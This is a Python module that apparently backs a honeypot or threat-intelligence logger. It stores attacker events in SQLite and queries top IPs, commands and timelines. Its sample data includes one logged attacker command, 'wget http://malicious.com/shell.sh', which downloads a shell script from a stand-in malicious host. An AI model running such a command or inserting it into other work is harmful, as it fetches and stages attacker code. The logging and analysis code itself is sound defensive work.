import os
import sqlite3

DB_PATH = os.path.join(os.path.dirname(__file__), "threat_intel.db")

def get_connection():
    return sqlite3.connect(DB_PATH)


def init_db():
    conn = get_connection()
    cursor = conn.cursor()

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        ip TEXT,
        username TEXT,
        command TEXT,
        event_type TEXT,
        success BOOLEAN
    )
    """)

    # Indexes (important for performance + realism)
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_ip ON events(ip)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_username ON events(username)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_timestamp ON events(timestamp)")

    conn.commit()
    conn.close()
def insert_event(event):
    """
    Accept either a single event dict or a list of event dicts.
    Normalizes 'success' to integer 0/1 for SQLite.
    """
    if isinstance(event, list):
        for e in event:
            insert_event(e)
        return

    conn = get_connection()
    cursor = conn.cursor()

    # normalize values and handle missing keys safely
    ts = event.get("timestamp")
    ip = event.get("ip")
    username = event.get("username")
    command = event.get("command")
    event_type = event.get("event_type")
    success = event.get("success")


    if isinstance(success, str):
        success_val = 1 if success.lower() in ("true", "1", "yes") else 0
    else:
        success_val = 1 if bool(success) else 0

    cursor.execute("""
        INSERT INTO events (timestamp, ip, username, command, event_type, success)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (ts, ip, username, command, event_type, success_val))

    conn.commit()
    conn.close()
def fetch_all():
    conn = get_connection()
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM events")
    rows = cursor.fetchall()

    conn.close()
    return rows
def insert_batch(events):
    conn = get_connection()
    cursor = conn.cursor()

    cursor.executemany("""
        INSERT INTO events (timestamp, ip, username, command, event_type, success)
        VALUES (?, ?, ?, ?, ?, ?)
    """, [
        (
            e["timestamp"],
            e["ip"],
            e["username"],
            e["command"],
            e["event_type"],
            e["success"]
        )
        for e in events
    ])

    conn.commit()
    conn.close()

def get_top_ips(limit=10):
    conn = get_connection()
    cursor = conn.cursor()

    cursor.execute("""
        SELECT ip, COUNT(*) as count
        FROM events
        GROUP BY ip
        ORDER BY count DESC
        LIMIT ?
    """, (limit,))

    results = cursor.fetchall()
    conn.close()
    return results
def get_timeline():
    conn = get_connection()
    cursor = conn.cursor()

    cursor.execute("""
        SELECT substr(timestamp, 1, 13) as hour, COUNT(*)
        FROM events
        GROUP BY hour
        ORDER BY hour
    """)

    results = cursor.fetchall()
    conn.close()
    return results
def get_top_commands(limit=10):
    conn = get_connection()
    cursor = conn.cursor()

    cursor.execute("""
        SELECT command, COUNT(*) as count
        FROM events
        GROUP BY command
        ORDER BY count DESC
        LIMIT ?
    """, (limit,))

    results = cursor.fetchall()
    conn.close()
    return results
def search_events(query):
    conn = get_connection()
    cursor = conn.cursor()

    wildcard = f"%{query}%"

    cursor.execute("""
        SELECT * FROM events
        WHERE ip LIKE ?
        OR username LIKE ?
        OR command LIKE ?
        OR timestamp LIKE ?
    """, (wildcard, wildcard, wildcard, wildcard))

    results = cursor.fetchall()
    conn.close()
    return results






if __name__ == "__main__":
    init_db()

    sample_events = [
      {
        "timestamp": "2026-04-19T10:00:00Z",
        "ip": "185.23.44.10",
        "username": "admin",
        "command": "failed login",
        "event_type": "login",
        "success": "false"
      },
      {
        "timestamp": "2026-04-19T10:01:00Z",
        "ip": "185.23.44.10",
        "username": "root",
        "command": "ls",
        "event_type": "command",
        "success": "false"
      },
      {
        "timestamp": "2026-04-19T10:02:00Z",
        "ip": "91.200.12.5",
        "username": "guest",
        "command": "wget http://malicious.com/shell.sh",
        "event_type": "download",
        "success": "false"
      }
    ]

    insert_event(sample_events)
    print(f"Inserted {len(sample_events)} sample events")